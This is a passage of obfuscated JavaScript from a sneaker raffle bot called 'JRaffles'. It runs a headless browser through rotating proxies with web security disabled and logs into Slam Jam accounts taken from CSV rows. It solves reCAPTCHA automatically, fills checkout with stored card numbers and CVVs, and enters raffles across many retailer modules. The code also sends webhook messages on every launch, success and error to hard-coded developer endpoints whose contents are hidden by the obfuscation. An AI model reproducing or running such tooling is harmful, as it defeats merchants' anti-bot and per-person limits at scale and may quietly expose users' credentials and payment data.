                            var _0x3e6fe9 = '', _0x255983 = 0x0;
                        _0x2167ba(_0x160e1f['name'] + '\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20/\x20' + _0x29aad2['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21), await _0x200aab(_0x29aad2, _0x4c3c99);
                        if (_0x29aad2[_0x4c3c99]['Email'] == '' || _0x29aad2[_0x4c3c99]['Password'] == '' || _0x29aad2[_0x4c3c99]['FirstName'] == '' || _0x29aad2[_0x4c3c99]['LastName'] == '') {
                            console['log'](_0x27df86() + '\x20[' + _0x160e1f['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x1c5a09['useRandomProxy'] = ![])
                            var _0x49eb13 = _0xa2815a[_0x4c3c99]['split'](':');
                        else
                            var _0x2249cb = Math['round'](Math['random']() * (_0xa2815a['length'] - 0x1)), _0x49eb13 = _0xa2815a[_0x2249cb]['split'](':');
                        const _0x25fa06 = await _0x59f17d['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x49eb13[0x0] + ':' + _0x49eb13[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x3db989 = await _0x25fa06['newPage']();
                            await _0x3db989['authenticate']({
                                'username': '' + _0x49eb13[0x2],
                                'password': '' + _0x49eb13[0x3]
                            }), await _0x3db989['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x27df86() + '\x20[' + _0x160e1f['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3db989['setRequestInterception'](!![]), _0x3db989['on']('request', _0x44cd6c => {
                                _0x44cd6c['resourceType']() === 'image' || _0x44cd6c['resourceType']() === 'font' || _0x44cd6c['resourceType']() === 'media' ? _0x44cd6c['abort']() : _0x44cd6c['continue']();
                            }), await _0x3db989['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x3db989['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x3db989['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xbec2fc(0x258), await _0x3db989['waitForSelector']('#CustomerEmail'), console['log'](_0x27df86() + '\x20[' + _0x160e1f['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x3db989['type']('#CustomerEmail', '' + _0x29aad2[_0x4c3c99]['Email']), await _0xbec2fc(0x12c), await _0x3db989['type']('#CustomerPassword', '' + _0x29aad2[_0x4c3c99]['Password']), await _0xbec2fc(0x226), await _0x3db989['$eval']('#customer_login', _0x285e8a => _0x285e8a['submit']()), await _0xbec2fc(0x7d0), await _0x3db989['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x27df86() + '\x20[' + _0x160e1f['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20' + _0xe1d9e['cyan']('Solving\x20Captcha')), await _0x3db989['solveRecaptchas'](), console['log'](_0x27df86() + '\x20[' + _0x160e1f['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x3db989['$eval']('.shopify-challenge__container\x20>\x20form', _0x5a0cff => _0x5a0cff['submit']());
                            try {
                                await _0x3db989['waitForSelector']('.nav-account'), await _0xbec2fc(0x4b0);
                            } catch {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x160e1f['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x3db989['goto']('' + _0x29aad2[_0x4c3c99]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xbec2fc(0xbb8), console['log'](_0x27df86() + '\x20[' + _0x160e1f['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x3db989['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x3db989['click']('.product-select-variant-wrapper'), await _0xbec2fc(0x320), await _0x3db989['click']('li.product-select-variant__value[data-size=\x22' + _0x29aad2[_0x4c3c99]['Size'] + '\x22]'), await _0xbec2fc(0x384), await _0x3db989['$eval']('#AddToCartForm-product-template-raffle', _0x1bba69 => _0x1bba69['submit']()), await _0x3db989['waitForSelector']('.cart-order-summary__content'), await _0xbec2fc(0x514), await _0x3db989['goto']('https://drop.slamjam.com/checkout'), await _0xbec2fc(0x514), await _0x3db989['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x27df86() + '\x20[' + _0x160e1f['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3db989['select']('#checkout_shipping_address_country', '' + _0x29aad2[_0x4c3c99]['Country']), await _0xbec2fc(0x200), await _0x3db989['waitForSelector']('#checkout_shipping_address_first_name'), await _0x3db989['type']('#checkout_shipping_address_first_name', '' + _0x29aad2[_0x4c3c99]['FirstName']), await _0xbec2fc(0x237), await _0x3db989['type']('#checkout_shipping_address_last_name', '' + _0x29aad2[_0x4c3c99]['LastName']), await _0xbec2fc(0x1e0), await _0x3db989['type']('#checkout_shipping_address_address1', _0x29aad2[_0x4c3c99]['Address1'] + '\x20' + _0x29aad2[_0x4c3c99]['HouseNumber']), await _0xbec2fc(0x514), await _0x3db989['type']('#checkout_shipping_address_address2', '' + _0x29aad2[_0x4c3c99]['Address2']), await _0xbec2fc(0x514);
                            _0x29aad2[_0x4c3c99]['Postcode'] == undefined && (_0x29aad2[_0x4c3c99]['Postcode'] = _0x29aad2[_0x4c3c99]['Zip']);
                            await _0x3db989['type']('#checkout_shipping_address_zip', '' + _0x29aad2[_0x4c3c99]['Postcode']), await _0xbec2fc(0x2bc), await _0x3db989['type']('#checkout_shipping_address_city', '' + _0x29aad2[_0x4c3c99]['City']), await _0xbec2fc(0x320), await _0x3db989['type']('#checkout_shipping_address_phone', '' + _0x29aad2[_0x4c3c99]['Phone']), await _0xbec2fc(0x320), await _0x3db989['click']('#continue_button'), await _0xbec2fc(0xbb8), await _0x3db989['waitForSelector']('.summary-title'), await _0xbec2fc(0x320), await _0x3db989['click']('#continue_button'), await _0xbec2fc(0x320), console['log'](_0x27df86() + '\x20[' + _0x160e1f['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x3db989['waitForSelector']('#checkout_credit_card_vault'), await _0xbec2fc(0x3e8);
                            var _0x5a2785 = await _0x3db989['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x250a4f = await _0x5a2785['contentFrame']();
                            await _0x250a4f['click']('#number'), await _0xbec2fc(0x3e8), await _0x250a4f['type']('#number', '' + _0x29aad2[_0x4c3c99]['CardNumber'], { 'delay': 0x78 }), _0x5a2785 = await _0x3db989['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x250a4f = await _0x5a2785['contentFrame'](), await _0xbec2fc(0x1c2), await _0x250a4f['click']('#name'), await _0xbec2fc(0x1f4), await _0x250a4f['type']('#name', '' + _0x29aad2[_0x4c3c99]['NameOnCard'], { 'delay': 0x78 }), _0x5a2785 = await _0x3db989['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x250a4f = await _0x5a2785['contentFrame'](), await _0xbec2fc(0x1c2), await _0x250a4f['click']('#expiry'), await _0xbec2fc(0x1f4), await _0x250a4f['type']('#expiry', '' + _0x29aad2[_0x4c3c99]['ExpiryDate'], { 'delay': 0x78 }), _0x5a2785 = await _0x3db989['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x250a4f = await _0x5a2785['contentFrame'](), await _0xbec2fc(0x1c2), await _0x250a4f['click']('#verification_value'), await _0xbec2fc(0x1f4), await _0x250a4f['type']('#verification_value', '' + _0x29aad2[_0x4c3c99]['CVV'], { 'delay': 0x78 }), await _0x3db989['$eval']('#accepts-flag-raffle', _0x356308 => _0x356308['click']()), await _0xbec2fc(0x7d0), console['log'](_0x27df86() + '\x20[' + _0x160e1f['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x3db989['$eval']('#continue_button', _0x286ca1 => _0x286ca1['click']()), await _0xbec2fc(0x1b58), await _0x3db989['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x3db989['$eval']('.edit_checkout.animate-floating-labels', _0x38f9b2 => _0x38f9b2['submit']()), await _0xbec2fc(0x7d0);
                            try {
                                await _0x3db989['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x3e6fe9 = 'no', _0x498d8e(_0x29aad2[_0x4c3c99], _0x160e1f), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x160e1f['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x4e4bbd) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x4e4bbd['message']);
                            }
                            var _0x19fec6 = await _0x597409(_0x29aad2[_0x4c3c99], _0x160e1f, 'dev', ![]), _0x1c85bd = await _0x597409(_0x29aad2[_0x4c3c99], _0x160e1f, 'pub', ![]);
                            const _0xf0b4b5 = {
                                'succesDEVMSG': { 'embeds': [_0x19fec6] },
                                'succesPUBMSG': { 'embeds': [_0x1c85bd] }
                            };
                            try {
                                _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0xf0b4b5['succesDEVMSG']), await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0xf0b4b5['succesDEVMSG']), await _0xbec2fc(0xc8), await _0x4f1a4a(_0x53e58f, _0xf0b4b5['succesPUBMSG']);
                            } catch (_0x21c83c) {
                                console['log'](_0xe1d9e['yellow'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x21c83c));
                            }
                        } catch (_0x311f19) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x11a818[taskModule]['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20' + _0x311f19)), _0x4d1325 = '' + _0x311f19;
                            var _0x1635c0 = await _0x597409(kickz[_0x4c3c99], _0x160e1f, 'dev', !![], _0x4d1325);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x1635c0] }, _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], EMBEDS['errorDEV']), await _0x4f1a4a(_0x166efb, EMBEDS['errorDEV']), _0x3e6fe9 = 'yes';
                        } finally {
                            _0x25fa06 && _0x25fa06['close']();
                            if (_0x3e6fe9 == 'yes' && _0x255983 != 0x5 && _0x4d1325 != 'Size\x20Not\x20Found') {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x160e1f['name'] + ']\x20Task\x20' + (_0x4c3c99 + 0x1) + '\x20:\x20Retrying')), _0x4c3c99 = _0x4c3c99 - 0x1, _0x255983 = _0x255983 + 0x1;
                                continue;
                            }
                            _0x3e6fe9 == 'yes' && _0x255983 >= 0x5 && (_0x176a1f(_0x29aad2[_0x4c3c99], _0x160e1f), _0x3e6fe9 = 'no', _0x255983 = 0x0), console['log']('Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x3ae9af) {
                    var _0x93260e = await _0x34d513(), _0x31aea8 = _0x5b2323['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x3b8def = _0x2faa61['parse'](_0x31aea8, { 'header': !![] })['data'];
                    for (var _0xbc5c4e = 0x0; _0xbc5c4e < _0x3b8def['length']; _0xbc5c4e++) {
                        var _0x27aba2 = _0x3b8def[_0xbc5c4e]['Store'], _0x211756 = _0x3b8def[_0xbc5c4e]['Mode'];
                        for (var _0x295ef3 of _0x11a818) {
                            const _0x3fd530 = _0x295ef3['name']['includes'](_0x27aba2);
                            if (!_0x3fd530)
                                continue;
                            for (mode of _0x295ef3['modules']) {
                                if (mode['name'] == _0x211756) {
                                    console['log']('Running\x20' + _0xe1d9e['cyan'](mode['name'])), await mode['function'](mode, [_0x3b8def[_0xbc5c4e]], _0x93260e);
                                    var _0x184db7 = _0x31aea8['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x5b2323['writeFileSync']('../failed-tasks.csv', _0x184db7);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0xdfc3fd = await _0x242d5a['get']('Answer');
                    if (_0xdfc3fd['Answer']['toLowerCase']() == 'y') {
                        _0x5b2323['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0xbec2fc(0x3e8);
                        return;
                    }
                    if (_0xdfc3fd['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0xbec2fc(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0xbec2fc(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x56fa98(_0x3b9d69) {
    var _0x5408ec = await _0x34d513(), _0x5a8703 = _0x5b2323['readFileSync']('../failed-tasks.csv', 'utf-8'), _0xf4f69f = _0x2faa61['parse'](_0x5a8703, { 'header': !![] })['data'];
    for (var _0x4697ba = 0x0; _0x4697ba < _0xf4f69f['length']; _0x4697ba++) {
        var _0x54921e = _0xf4f69f[_0x4697ba]['Store'], _0x16cb84 = _0xf4f69f[_0x4697ba]['Mode'];
        for (var _0x324129 of _0x11a818) {
            const _0x58dd7b = _0x324129['name']['includes'](_0x54921e);
            if (_0x58dd7b)
                for (mode of _0x11a818[_0x324129]['modules']) {
                    const _0x39050c = mode['name']['includes'](_0x16cb84);
                    _0x39050c && (_0x3b9d69 = mode['name'], await mode['function'](_0x3b9d69, _0xf4f69f[_0x4697ba], _0x5408ec));
                }
        }
    }
}
async function _0x4832c2() {
    await _0x534b78(), console['clear']();
    if (_0x18cd5d != 'devkey') {
        let _0x80682e = await _0x3ee0f4['autoUpdate']();
        if (_0x80682e === 'yes')
            return _0x3a5396('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0xb2f9e4 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0xbec2fc(0x2710);
        ;
    }
    await _0x3e287c(_0xb2f9e4);
    if (_0x456666 === ![])
        return console['log']('Closing\x20Browser'), await _0xbec2fc(0xbb8);
    else
        try {
            var _0x55893b = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x50a8aa
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x18cd5d
                    }
                ]
            }];
            const _0x11350e = { 'embeds': _0x55893b };
            var _0x2f3b3a = await _0x597409(null, null, 'open', ![]);
            const _0x2fcdf1 = { 'openDEVMSG': { 'embeds': [_0x2f3b3a] } };
            await _0x4f1a4a(_0x4caa2e, _0x2fcdf1['openDEVMSG']);
            async function _0x1eb6b6() {
                _0x2167ba('JRaffles\x20' + _0x18cd5d), console['clear'](), console['log']('Welcome\x20to\x20' + _0xe1d9e['cyan']('JRaffles();') + '\x20' + _0x18cd5d), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x185ca2 = 0x0; _0x185ca2 < _0x11a818['length'] - 0x4; _0x185ca2++) {
                    if (_0x185ca2 >= 0xa) {
                        console['log']('\x20(' + _0x185ca2 + ')\x20[' + _0x11a818[_0x185ca2]['name'] + ']');
                        continue;
                    }
                    if (_0x11a818[_0x185ca2]['name'] === 'Reload\x20Settings' || _0x11a818[_0x185ca2]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x185ca2 + ')\x20\x20[' + _0x11a818[_0x185ca2]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x11a818['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x11a818['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x11a818['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x11a818['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x308776();
                if (taskModule > _0x11a818['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0xbec2fc(0x3e8), _0x1eb6b6();
                if (_0x11a818[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                    var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x56f9af = await _0x34d513(), _0x496b9c = await _0x1a2da6();
                        await _0x1e8cb3['function'](_0x1e8cb3, _0x496b9c, _0x56f9af);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x56f9af = await _0x34d513(), _0x496b9c = await _0x1a2da6();
                            await _0x1e8cb3['function'](_0x1e8cb3, _0x496b9c, _0x56f9af);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x56f9af = await _0x34d513();
                                await _0x1e8cb3['function'](_0x1e8cb3, _0x3d2371, _0x56f9af);
                            }
                        }
                    }
                    return _0x1eb6b6();
                }
                if (_0x11a818[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                        var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x56f9af = await _0x34d513(), _0x520104 = await _0x1a2da6();
                            await _0x1e8cb3['function'](_0x1e8cb3, _0x520104, _0x56f9af);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x56f9af = await _0x34d513(), _0x520104 = await _0x1a2da6();
                                await _0x1e8cb3['function'](_0x1e8cb3, _0x520104, _0x56f9af);
                            }
                        }
                    } catch (_0x30de78) {
                        console['log'](_0x30de78), await _0xbec2fc(0xfa0);
                    }
                    return _0x1eb6b6();
                }
                if (_0x11a818[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                    var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x56f9af = await _0x34d513();
                        return await _0x1e8cb3['function'](_0x1e8cb3, _0x56f9af), _0x1eb6b6();
                    }
                    var _0x56f9af = await _0x34d513(), _0x10c870 = await _0x1a2da6();
                    return await _0x1e8cb3['function'](_0x1e8cb3, _0x10c870, _0x56f9af), _0x1eb6b6();
                }
                if (_0x11a818[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                    var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x56f9af = await _0x34d513(), _0x10c870 = await _0x1a2da6();
                    return await _0x1e8cb3['function'](_0x1e8cb3, _0x10c870, _0x56f9af), _0x1eb6b6();
                } else {
                    if (_0x11a818[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                        var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x56f9af = await _0x34d513(), _0x2fca46 = await _0x1a2da6();
                            return await _0x1e8cb3['function'](_0x1e8cb3, _0x2fca46, _0x56f9af), _0x1eb6b6();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x56f9af = await _0x34d513();
                                return await _0x1e8cb3['function'](_0x1e8cb3, _0x3d2371, _0x56f9af), _0x1eb6b6();
                            }
                        }
                        ;
                    } else {
                        if (_0x11a818[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                            var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction], _0x56f9af = await _0x34d513(), _0x55a84b = await _0x1a2da6();
                            return await _0x1e8cb3['function'](_0x1e8cb3, _0x55a84b, _0x56f9af), await _0xbec2fc(0x1388), _0x1eb6b6();
                        } else {
                            if (_0x11a818[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                                var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x56f9af = await _0x34d513(), _0x2fca46 = await _0x1a2da6();
                                    return await _0x1e8cb3['function'](_0x1e8cb3, _0x2fca46, _0x56f9af), _0x1eb6b6();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x56f9af = await _0x34d513();
                                        return await _0x1e8cb3['function'](_0x1e8cb3, _0x3d2371, _0x56f9af), _0x1eb6b6();
                                    }
                                }
                                ;
                            } else {
                                if (_0x11a818[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                                    var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x225582('https://bouncewear.com/nl/account/register', _0x1e8cb3);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x11a818[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                                        var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x56f9af = await _0x34d513(), _0x406f43 = await _0x1a2da6();
                                            return await _0x1e8cb3['function']('', _0x1e8cb3, _0x406f43, _0x56f9af), _0x1eb6b6();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x56f9af = await _0x34d513(), _0x406f43 = await _0x1a2da6();
                                                return await _0x1e8cb3['function'](_0x1e8cb3, _0x406f43, _0x56f9af), _0x1eb6b6();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x11a818[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                                            var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x56f9af = await _0x34d513(), _0x1d0840 = await _0x1a2da6();
                                                return await _0x1e8cb3['function'](_0x1e8cb3, _0x1d0840, _0x56f9af), _0x1eb6b6();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x56f9af = await _0x34d513(), _0x1d0840 = await _0x1a2da6();
                                                    return await _0x1e8cb3['function'](_0x1e8cb3, _0x1d0840, _0x56f9af), _0x1eb6b6();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x11a818[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                                                var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x56f9af = await _0x34d513(), _0x153163 = await _0x1a2da6();
                                                    return await _0x1e8cb3['function']('https://www.kickz.com/nl/login/', _0x1e8cb3, _0x153163, _0x56f9af), _0x1eb6b6();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x56f9af = await _0x34d513(), _0x153163 = await _0x1a2da6();
                                                        return await _0x1e8cb3['function'](_0x1e8cb3, _0x153163, _0x56f9af), _0x1eb6b6();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x11a818[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                                                    var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x56f9af = await _0x34d513(), _0x15f150 = await _0x1a2da6();
                                                        return await _0x1e8cb3['function'](_0x1e8cb3, _0x15f150, _0x56f9af), _0x1eb6b6();
                                                    }
                                                } else {
                                                    if (_0x11a818[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0xbec2fc(0x3e8), _0x1eb6b6();
                                                    else {
                                                        if (_0x11a818[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x31e031 = _0x11a818[taskModule]['name'], _0x56f9af = await _0x34d513();
                                                            const _0x41385a = await _0x12eab5();
                                                            var _0x3d2371 = _0x41385a['split'](';');
                                                            await _0xa38ef8(_0x3d2371, _0x31e031, _0x56f9af);
                                                        } else {
                                                            if (_0x11a818[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x8ae395(_0x11a818[taskModule]['modules']);
                                                                var _0x1e8cb3 = _0x11a818[taskModule]['modules'][taskFunction];
                                                                return await _0x1e8cb3['function'](_0x1e8cb3), _0x1eb6b6();
                                                            } else {
                                                                if (_0x11a818[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x4763ba = 0x0;
                                                                    for (const _0x22ac8a in _0x1c5a09) {
                                                                        console['log']('(' + _0x4763ba + ')\x20' + _0x22ac8a + '\x20:\x20' + _0x1c5a09[_0x22ac8a]), _0x4763ba++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x4763ba + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x1f713e = await _0x236efe();
                                                                    if (_0x1f713e == _0x4763ba)
                                                                        return _0x1eb6b6();
                                                                    console['clear'];
                                                                    var _0x3206da = 0x0;
                                                                    for (var _0x49ca38 in _0x1c5a09) {
                                                                        if (_0x1f713e == _0x3206da) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x49ca38 + '\x20:'), _0x1c5a09[_0x49ca38] = await _0x256c43(), _0x5b2323['writeFileSync']('../settings.json', JSON['stringify'](_0x1c5a09));
                                                                            break;
                                                                        } else
                                                                            _0x3206da++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0xbec2fc(0xbb8), _0x1eb6b6();
                                                                } else {
                                                                    if (_0x11a818[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x534b78(), _0x1eb6b6();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x11a818[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x3359cc = await _0xaefec4();
                                                                            _0x3359cc == 'ModuleVoorDeBoys' ? (await _0x8d4527(), await _0x1fe9e8(), await afewFunction(_0x2515e4[_0x4f490c], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0xbec2fc(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x1eb6b6();
        } catch (_0x1ad4ba) {
            return console['log'](_0x1ad4ba), await _0xbec2fc(0x3a98);
        }
}
;
_0x2167ba('JRaffles\x20' + _0x18cd5d), _0x534b78();
try {
    _0x4832c2();
} catch (_0xcf66a9) {
    var _0x8938b3 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x50a8aa
            },
            {
                'name': 'Version',
                'value': '' + _0x18cd5d
            },
            {
                'name': 'Error',
                'value': '' + _0xcf66a9
            }
        ]
    }];
    const _0x4fd606 = { 'embeds': _0x8938b3 };
    _0x4f1a4a(_0x166efb, _0x4fd606);
}